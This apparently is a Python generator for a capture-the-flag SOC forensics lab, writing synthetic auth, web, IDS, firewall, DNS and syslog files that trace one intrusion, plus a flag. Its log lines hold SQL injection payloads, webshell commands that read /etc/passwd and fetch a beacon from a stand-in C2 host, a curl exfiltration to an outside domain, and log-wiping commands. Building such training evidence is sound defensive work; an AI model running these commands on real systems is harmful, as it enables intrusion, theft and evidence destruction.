#!/usr/bin/env python3
"""
stadium_soc — evidence + flag generator.

Creates synthetic SOC evidence files for the 40-question lab:
  - auth.log          SSH brute-force → successful root login + privesc
  - access.log        Apache access log showing web recon + SQLi + webshell
  - suricata.json     IDS alert log (ET rules, beaconing, exfil)
  - firewall.log      iptables deny/accept entries
  - dns_queries.log   DNS resolution log (C2 domain, DGA)
  - syslog            System events: cron, systemd, process exec
  - timeline.csv      Unified timeline for correlation

All evidence tells a single coherent attack story. Timestamps are
consistent across files. IOCs (attacker IP, C2 domain, hashes, etc.)
are fixed so the 40 questions have deterministic answers.
"""
from __future__ import annotations
import argparse, hashlib, secrets
from pathlib import Path

HERE = Path(__file__).resolve().parent
EVIDENCE = HERE / "evidence"

# ── Fixed IOCs (deterministic across builds) ──────────────────────
ATTACKER_IP    = "185.196.8.23"
ATTACKER_IP2   = "91.215.85.142"
INTERNAL_WEB   = "10.10.10.50"
INTERNAL_DB    = "10.10.10.51"
JUMPBOX        = "10.10.10.10"
C2_DOMAIN      = "c2.stadium-ops.example"
C2_IP          = "194.26.135.89"
C2_PORT        = "4444"
EXFIL_DOMAIN   = "paste.darkleaf.cc"
DGA_DOMAINS    = ["xk3mf9a2.biz", "q7hnwp4e.biz", "r2djc8v1.biz"]
BEACON_HASH    = "3c455a78ab7362b7df8a1a4fc53e7fd9"
BEACON_SHA256  = "428f369be57088cc0708b753546c7f7fa25b269deae37c5228509d772b962502"
WEBSHELL_NAME  = "cmd.php"
WEBSHELL_PATH  = "/var/www/html/uploads/cmd.php"
CRON_PERSIST   = "/etc/cron.d/.sysupdate"
SERVICE_PERSIST = "/etc/systemd/system/stadium-telemetry.service"
COMPROMISED_USER = "ops_manager"
EXFIL_FILE     = "/tmp/.stage/matchdata.tar.gz.enc"
MITRE_INITIAL  = "T1110.001"   # Brute Force: Password Guessing
MITRE_PERSIST  = "T1053.003"   # Scheduled Task/Job: Cron
MITRE_PRIVESC  = "T1548.003"   # Abuse Elevation: Sudo
MITRE_LATERAL  = "T1021.004"   # Remote Services: SSH
MITRE_C2       = "T1071.001"   # App Layer Protocol: Web
MITRE_EXFIL    = "T1048.003"   # Exfiltration Over Alternative Protocol
MITRE_EXEC     = "T1059.004"   # Command and Scripting: Unix Shell
MALICIOUS_UA   = "Mozilla/5.0 (X11; Linux) StadiumBot/1.0"
SQLI_PAYLOAD   = "' OR 1=1 UNION SELECT username,password FROM users--"
XOR_KEY        = "0x5a"
DATE           = "2026-03-15"


def write_auth_log():
    lines = []
    # SSH brute force from attacker
    for i in range(22):
        t = f"Mar 15 03:{40+i//6:02d}:{10+i*3:02d}"
        lines.append(f"{t} jumpbox sshd[{4100+i}]: Failed password for root from {ATTACKER_IP} port {50000+i} ssh2")
    # Successful login
    lines.append(f"Mar 15 03:47:24 jumpbox sshd[4122]: Accepted password for root from {ATTACKER_IP} port 50022 ssh2")
    lines.append(f"Mar 15 03:47:24 jumpbox sshd[4122]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)")
    # Attacker creates user
    lines.append(f"Mar 15 03:48:01 jumpbox useradd[4130]: new user: name={COMPROMISED_USER}, UID=1001, GID=1001, home=/home/{COMPROMISED_USER}, shell=/bin/bash")
    lines.append(f"Mar 15 03:48:05 jumpbox passwd[4131]: pam_unix(passwd:chkpwd): password changed for {COMPROMISED_USER}")
    # Lateral movement SSH to web server
    lines.append(f"Mar 15 03:49:12 jumpbox sshd[4140]: Accepted publickey for root from {JUMPBOX} port 36422 ssh2")
    lines.append(f"Mar 15 03:49:15 webserver sshd[2200]: Accepted password for {COMPROMISED_USER} from {JUMPBOX} port 52100 ssh2")
    lines.append(f"Mar 15 03:49:15 webserver sshd[2200]: pam_unix(sshd:session): session opened for user {COMPROMISED_USER}(uid=1001) by (uid=0)")
    # Sudo abuse on webserver
    lines.append(f"Mar 15 03:50:30 webserver sudo: {COMPROMISED_USER} : TTY=pts/1 ; PWD=/home/{COMPROMISED_USER} ; USER=root ; COMMAND=/usr/bin/find / -perm -u=s")
    lines.append(f"Mar 15 03:51:02 webserver sudo: {COMPROMISED_USER} : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash")
    lines.append(f"Mar 15 03:51:10 webserver sudo: {COMPROMISED_USER} : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -e")
    # Second attacker IP doing recon later
    for i in range(5):
        t = f"Mar 15 04:{10+i}:00"
        lines.append(f"{t} jumpbox sshd[{4200+i}]: Failed password for admin from {ATTACKER_IP2} port {51000+i} ssh2")
    EVIDENCE.mkdir(parents=True, exist_ok=True)
    (EVIDENCE / "auth.log").write_text("\n".join(lines) + "\n")


def write_access_log():
    lines = []
    # Normal traffic
    lines.append(f'10.10.10.1 - - [15/Mar/2026:03:30:00 +0000] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0 Chrome/120"')
    lines.append(f'10.10.10.2 - - [15/Mar/2026:03:35:00 +0000] "GET /matches HTTP/1.1" 200 3200 "-" "Mozilla/5.0 Firefox/115"')
    # Attacker recon
    lines.append(f'{ATTACKER_IP} - - [15/Mar/2026:03:45:00 +0000] "GET /robots.txt HTTP/1.1" 200 154 "-" "{MALICIOUS_UA}"')
    lines.append(f'{ATTACKER_IP} - - [15/Mar/2026:03:45:05 +0000] "GET /admin HTTP/1.1" 403 280 "-" "{MALICIOUS_UA}"')
    lines.append(f'{ATTACKER_IP} - - [15/Mar/2026:03:45:10 +0000] "GET /.git/config HTTP/1.1" 200 240 "-" "{MALICIOUS_UA}"')
    lines.append(f'{ATTACKER_IP} - - [15/Mar/2026:03:45:15 +0000] "GET /.env HTTP/1.1" 200 180 "-" "{MALICIOUS_UA}"')
    # SQLi
    lines.append(f'{ATTACKER_IP} - - [15/Mar/2026:03:46:00 +0000] "GET /search?q={SQLI_PAYLOAD} HTTP/1.1" 200 8400 "-" "{MALICIOUS_UA}"')
    sqli2 = "' UNION SELECT table_name,NULL FROM information_schema.tables--"
    lines.append(f'{ATTACKER_IP} - - [15/Mar/2026:03:46:20 +0000] "GET /search?q={sqli2} HTTP/1.1" 200 12000 "-" "{MALICIOUS_UA}"')
    # Webshell upload
    lines.append(f'{ATTACKER_IP} - - [15/Mar/2026:03:47:30 +0000] "POST /upload HTTP/1.1" 200 45 "-" "{MALICIOUS_UA}"')
    lines.append(f'{ATTACKER_IP} - - [15/Mar/2026:03:47:35 +0000] "GET /uploads/{WEBSHELL_NAME}?cmd=id HTTP/1.1" 200 60 "-" "{MALICIOUS_UA}"')
    lines.append(f'{ATTACKER_IP} - - [15/Mar/2026:03:47:40 +0000] "GET /uploads/{WEBSHELL_NAME}?cmd=cat+/etc/passwd HTTP/1.1" 200 1200 "-" "{MALICIOUS_UA}"')
    lines.append(f'{ATTACKER_IP} - - [15/Mar/2026:03:48:00 +0000] "GET /uploads/{WEBSHELL_NAME}?cmd=wget+http://{C2_DOMAIN}:{C2_PORT}/beacon+-O+/tmp/beacon HTTP/1.1" 200 20 "-" "{MALICIOUS_UA}"')
    # Exfiltration via POST
    lines.append(f'{ATTACKER_IP} - - [15/Mar/2026:03:52:00 +0000] "POST /uploads/{WEBSHELL_NAME} HTTP/1.1" 200 15 "-" "curl/7.88.1"')
    (EVIDENCE / "access.log").write_text("\n".join(lines) + "\n")


def write_suricata():
    alerts = []
    alerts.append(f'{{"timestamp":"2026-03-15T03:40:10","event_type":"alert","src_ip":"{ATTACKER_IP}","src_port":50000,"dest_ip":"{JUMPBOX}","dest_port":22,"alert":{{"action":"allowed","gid":1,"signature_id":2001219,"rev":6,"signature":"ET SCAN Potential SSH Scan","category":"Attempted Information Leak","severity":2}}}}')
    alerts.append(f'{{"timestamp":"2026-03-15T03:46:00","event_type":"alert","src_ip":"{ATTACKER_IP}","src_port":50100,"dest_ip":"{INTERNAL_WEB}","dest_port":80,"alert":{{"action":"allowed","gid":1,"signature_id":2006546,"rev":5,"signature":"ET WEB_SERVER SQL Injection Attempt -- UNION SELECT","category":"Web Application Attack","severity":1}}}}')
    alerts.append(f'{{"timestamp":"2026-03-15T03:47:35","event_type":"alert","src_ip":"{ATTACKER_IP}","src_port":50200,"dest_ip":"{INTERNAL_WEB}","dest_port":80,"alert":{{"action":"allowed","gid":1,"signature_id":2008284,"rev":3,"signature":"ET WEB_SERVER PHP Webshell Command Execution","category":"Web Application Attack","severity":1}}}}')
    alerts.append(f'{{"timestamp":"2026-03-15T03:48:00","event_type":"alert","src_ip":"{INTERNAL_WEB}","src_port":42100,"dest_ip":"{C2_IP}","dest_port":{C2_PORT},"alert":{{"action":"allowed","gid":1,"signature_id":2024897,"rev":2,"signature":"ET MALWARE Cobalt Strike Beacon Activity","category":"A Network Trojan was detected","severity":1}}}}')
    alerts.append(f'{{"timestamp":"2026-03-15T03:50:00","event_type":"alert","src_ip":"{INTERNAL_WEB}","src_port":42200,"dest_ip":"{C2_IP}","dest_port":{C2_PORT},"alert":{{"action":"allowed","gid":1,"signature_id":2024897,"rev":2,"signature":"ET MALWARE Cobalt Strike Beacon Activity","category":"A Network Trojan was detected","severity":1}}}}')
    alerts.append(f'{{"timestamp":"2026-03-15T03:52:00","event_type":"alert","src_ip":"{INTERNAL_WEB}","src_port":55000,"dest_ip":"198.51.100.44","dest_port":443,"alert":{{"action":"allowed","gid":1,"signature_id":2013504,"rev":4,"signature":"ET POLICY curl User-Agent to External IP -- Possible Data Exfiltration","category":"Potential Corporate Privacy Violation","severity":2}}}}')
    # DGA traffic
    for i, d in enumerate(DGA_DOMAINS):
        alerts.append(f'{{"timestamp":"2026-03-15T03:{53+i}:00","event_type":"alert","src_ip":"{INTERNAL_WEB}","src_port":{55100+i},"dest_ip":"198.51.100.{50+i}","dest_port":443,"alert":{{"action":"allowed","gid":1,"signature_id":2029183,"rev":1,"signature":"ET MALWARE Suspected DGA Domain Lookup","category":"A Network Trojan was detected","severity":1}}}}')
    (EVIDENCE / "suricata.json").write_text("\n".join(alerts) + "\n")


def write_firewall():
    lines = []
    # Blocked scans from second attacker
    for i in range(8):
        lines.append(f"Mar 15 04:0{i}:00 jumpbox kernel: [iptables DROP] IN=eth0 OUT= SRC={ATTACKER_IP2} DST={JUMPBOX} LEN=44 PROTO=TCP SPT={60000+i} DPT={21+i*100} WINDOW=1024 SYN")
    # Allowed SSH
    lines.append(f"Mar 15 03:47:24 jumpbox kernel: [iptables ACCEPT] IN=eth0 OUT= SRC={ATTACKER_IP} DST={JUMPBOX} LEN=60 PROTO=TCP SPT=50022 DPT=22 WINDOW=64240 SYN")
    # Outbound C2
    lines.append(f"Mar 15 03:48:05 webserver kernel: [iptables ACCEPT] IN= OUT=eth0 SRC={INTERNAL_WEB} DST={C2_IP} LEN=60 PROTO=TCP SPT=42100 DPT={C2_PORT} WINDOW=64240 SYN")
    # Exfil
    lines.append(f"Mar 15 03:52:00 webserver kernel: [iptables ACCEPT] IN= OUT=eth0 SRC={INTERNAL_WEB} DST=198.51.100.44 LEN=1500 PROTO=TCP SPT=55000 DPT=443 WINDOW=64240 ACK PSH")
    # DNS to external
    lines.append(f"Mar 15 03:48:02 webserver kernel: [iptables ACCEPT] IN= OUT=eth0 SRC={INTERNAL_WEB} DST=8.8.8.8 LEN=72 PROTO=UDP SPT=53421 DPT=53")
    (EVIDENCE / "firewall.log").write_text("\n".join(lines) + "\n")


def write_dns():
    lines = []
    lines.append(f"2026-03-15T03:45:00 client {ATTACKER_IP}#50000: query: {JUMPBOX} IN A")
    lines.append(f"2026-03-15T03:48:01 client {INTERNAL_WEB}#53421: query: {C2_DOMAIN} IN A -> {C2_IP}")
    lines.append(f"2026-03-15T03:48:02 client {INTERNAL_WEB}#53422: query: {C2_DOMAIN} IN AAAA -> NXDOMAIN")
    lines.append(f"2026-03-15T03:51:50 client {INTERNAL_WEB}#53500: query: {EXFIL_DOMAIN} IN A -> 198.51.100.44")
    for i, d in enumerate(DGA_DOMAINS):
        lines.append(f"2026-03-15T03:{53+i}:00 client {INTERNAL_WEB}#5{3600+i}: query: {d} IN A -> 198.51.100.{50+i}")
    lines.append(f"2026-03-15T03:55:00 client 10.10.10.1#54000: query: www.infodays.ma IN A -> 104.21.5.100")
    (EVIDENCE / "dns_queries.log").write_text("\n".join(lines) + "\n")


def write_syslog():
    lines = []
    lines.append(f"Mar 15 03:47:30 jumpbox systemd[1]: Started Session 42 of user root.")
    lines.append(f"Mar 15 03:48:01 jumpbox useradd[4130]: new user: name={COMPROMISED_USER}, UID=1001")
    lines.append(f"Mar 15 03:48:10 jumpbox crontab[4135]: (root) REPLACE ({CRON_PERSIST})")
    lines.append(f"Mar 15 03:48:15 jumpbox systemd[1]: Created symlink /etc/systemd/system/multi-user.target.wants/stadium-telemetry.service -> {SERVICE_PERSIST}")
    lines.append(f"Mar 15 03:48:20 jumpbox systemd[1]: Starting stadium-telemetry.service - Stadium Telemetry Collector...")
    lines.append(f"Mar 15 03:48:21 jumpbox systemd[1]: Started stadium-telemetry.service - Stadium Telemetry Collector.")
    lines.append(f"Mar 15 03:49:15 webserver sshd[2200]: Accepted password for {COMPROMISED_USER} from {JUMPBOX}")
    lines.append(f"Mar 15 03:50:30 webserver sudo[2210]: {COMPROMISED_USER} : TTY=pts/1 ; COMMAND=/usr/bin/find / -perm -u=s")
    lines.append(f"Mar 15 03:51:02 webserver sudo[2215]: {COMPROMISED_USER} : TTY=pts/1 ; COMMAND=/bin/bash")
    lines.append(f"Mar 15 03:51:10 webserver sudo[2220]: {COMPROMISED_USER} : TTY=pts/1 ; COMMAND=/usr/bin/crontab -e")
    lines.append(f"Mar 15 03:51:30 webserver CRON[2225]: (root) CMD (/opt/stadium/.cache/daemon.sh >/dev/null 2>&1)")
    lines.append(f"Mar 15 03:51:45 webserver kernel: [UFW AUDIT] IN= OUT=eth0 SRC={INTERNAL_WEB} DST={C2_IP} PROTO=TCP DPT={C2_PORT}")
    lines.append(f"Mar 15 03:52:00 webserver curl[2230]: POST https://{EXFIL_DOMAIN}/drop --data-binary @{EXFIL_FILE}")
    lines.append(f"Mar 15 03:52:10 webserver bash[2235]: rm -rf /var/log/wtmp")
    lines.append(f"Mar 15 03:52:12 webserver bash[2236]: history -c && history -w")
    (EVIDENCE / "syslog").write_text("\n".join(lines) + "\n")


def write_timeline():
    rows = [
        "timestamp,source,host,event,details",
        f"2026-03-15T03:40:10,suricata,jumpbox,IDS Alert,ET SCAN Potential SSH Scan from {ATTACKER_IP}",
        f"2026-03-15T03:40:10,auth.log,jumpbox,Failed SSH,root login attempt from {ATTACKER_IP}",
        f"2026-03-15T03:45:00,access.log,webserver,Web Recon,robots.txt probe from {ATTACKER_IP}",
        f"2026-03-15T03:45:10,access.log,webserver,Sensitive File,.git/config accessed by {ATTACKER_IP}",
        f"2026-03-15T03:45:15,access.log,webserver,Sensitive File,.env accessed by {ATTACKER_IP}",
        f"2026-03-15T03:46:00,access.log,webserver,SQLi,UNION SELECT injection from {ATTACKER_IP}",
        f"2026-03-15T03:46:00,suricata,webserver,IDS Alert,ET WEB_SERVER SQL Injection",
        f"2026-03-15T03:47:24,auth.log,jumpbox,SSH Login,root login SUCCESS from {ATTACKER_IP}",
        f"2026-03-15T03:47:30,access.log,webserver,Webshell Upload,POST /upload from {ATTACKER_IP}",
        f"2026-03-15T03:47:35,access.log,webserver,Webshell Exec,GET /uploads/{WEBSHELL_NAME}?cmd=id",
        f"2026-03-15T03:48:00,access.log,webserver,Malware Download,wget from {C2_DOMAIN}:{C2_PORT}",
        f"2026-03-15T03:48:01,dns,webserver,DNS Query,{C2_DOMAIN} -> {C2_IP}",
        f"2026-03-15T03:48:01,syslog,jumpbox,User Created,{COMPROMISED_USER} (UID 1001)",
        f"2026-03-15T03:48:10,syslog,jumpbox,Persistence,cron job installed at {CRON_PERSIST}",
        f"2026-03-15T03:48:15,syslog,jumpbox,Persistence,systemd service {SERVICE_PERSIST}",
        f"2026-03-15T03:49:15,auth.log,webserver,Lateral Movement,SSH from {JUMPBOX} as {COMPROMISED_USER}",
        f"2026-03-15T03:50:30,auth.log,webserver,Sudo Abuse,{COMPROMISED_USER} ran find -perm -u=s",
        f"2026-03-15T03:51:02,auth.log,webserver,Privesc,{COMPROMISED_USER} escalated to root via sudo /bin/bash",
        f"2026-03-15T03:51:10,syslog,webserver,Persistence,crontab modified by {COMPROMISED_USER}",
        f"2026-03-15T03:51:50,dns,webserver,DNS Query,{EXFIL_DOMAIN} -> 198.51.100.44",
        f"2026-03-15T03:52:00,syslog,webserver,Exfiltration,curl POST to {EXFIL_DOMAIN} with {EXFIL_FILE}",
        f"2026-03-15T03:52:10,syslog,webserver,Anti-Forensics,rm -rf /var/log/wtmp",
        f"2026-03-15T03:52:12,syslog,webserver,Anti-Forensics,history -c && history -w",
        f"2026-03-15T03:53:00,suricata,webserver,IDS Alert,Suspected DGA domain {DGA_DOMAINS[0]}",
        f"2026-03-15T04:00:00,firewall,jumpbox,Port Scan,SYN scan from {ATTACKER_IP2} blocked",
    ]
    (EVIDENCE / "timeline.csv").write_text("\n".join(rows) + "\n")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--hex", default=None)
    args = ap.parse_args()
    rand_hex = args.hex or secrets.token_hex(4)
    flag = f"INFODAYS{{SaamNoLimits_soc_analyst_certified_{rand_hex}}}"

    EVIDENCE.mkdir(parents=True, exist_ok=True)
    write_auth_log()
    write_access_log()
    write_suricata()
    write_firewall()
    write_dns()
    write_syslog()
    write_timeline()

    (HERE / ".env").write_text(f"FLAG={flag}\n")
    (HERE / "flag.txt").write_text(f"{flag}\n")
    print(f"[gen] hex={rand_hex}")
    print(f"[gen] flag -> {flag}")
    print(f"[gen] wrote evidence/ .env flag.txt")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
